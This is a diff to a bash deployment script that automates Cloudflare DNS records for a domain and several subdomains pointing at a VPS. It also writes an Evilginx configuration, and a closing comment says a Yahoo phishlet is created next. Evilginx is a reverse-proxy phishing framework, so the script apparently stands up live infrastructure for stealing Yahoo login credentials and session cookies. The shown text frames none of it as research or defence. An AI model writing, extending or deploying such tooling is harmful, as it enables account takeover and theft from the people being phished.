@@ -146,6 +146,44 @@ validate_config() {
 }
 
 # ============================================================================
+# Update Cloudflare DNS records
+# ============================================================================
+update_dns() {
+    log "Updating Cloudflare DNS records..."
+    local zone_id
+    zone_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones?name=$DOMAIN" \
+        -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
+        -H "Content-Type: application/json" | jq -r '.result[0].id')
+
+    if [[ "$zone_id" == "null" || -z "$zone_id" ]]; then
+        err "Could not find Zone ID for $DOMAIN in Cloudflare. Check your token permissions."
+    fi
+
+    local records=("$DOMAIN" "$EP1.$DOMAIN" "$EP2.$DOMAIN" "$EP3.$DOMAIN")
+    for record in "${records[@]}"; do
+        log "Setting A record for $record -> $VPS_IP"
+        local existing_id
+        existing_id=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records?name=$record&type=A" \
+            -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
+            -H "Content-Type: application/json" | jq -r '.result[0].id')
+
+        local payload="{\"type\":\"A\",\"name\":\"$record\",\"content\":\"$VPS_IP\",\"ttl\":120,\"proxied\":false}"
+        
+        if [[ "$existing_id" != "null" && -n "$existing_id" ]]; then
+            curl -s -X PUT "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records/$existing_id" \
+                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
+                -H "Content-Type: application/json" \
+                -d "$payload" > /dev/null
+        else
+            curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$zone_id/dns_records" \
+                -H "Authorization: Bearer $CLOUDFLARE_TOKEN" \
+                -H "Content-Type: application/json" \
+                -d "$payload" > /dev/null
+        fi
+    done
+}
+
+# ============================================================================
 # Pre-flight checks
 # ============================================================================
 preflight_checks() {
@@ -530,17 +568,17 @@ configure_evilginx_integration() {
 
     # Create Evilginx config
     cat > "$EVILGINX_DIR/config.yaml" << EOF
-daemon = false
-debug = false
-version = 3.0.0
-domain = $DOMAIN
-ipv4 = 0.0.0.0
-http_port = 8081
-https_port = 8443
-redirect_url = https://www.google.com
-phishlets_path = $EVILGINX_DIR/phishlets
-cert_path = $EVILGINX_DIR/certs
-database = $EVILGINX_DIR/evilginx.db
+daemon: false
+debug: false
+version: 3.0.0
+domain: $DOMAIN
+ipv4: 0.0.0.0
+http_port: 8081
+https_port: 8443
+redirect_url: https://www.google.com
+phishlets_path: $EVILGINX_DIR/phishlets
+cert_path: $EVILGINX_DIR/certs
+database: $EVILGINX_DIR/evilginx.db
 EOF
 
     # Create Yahoo phishlet
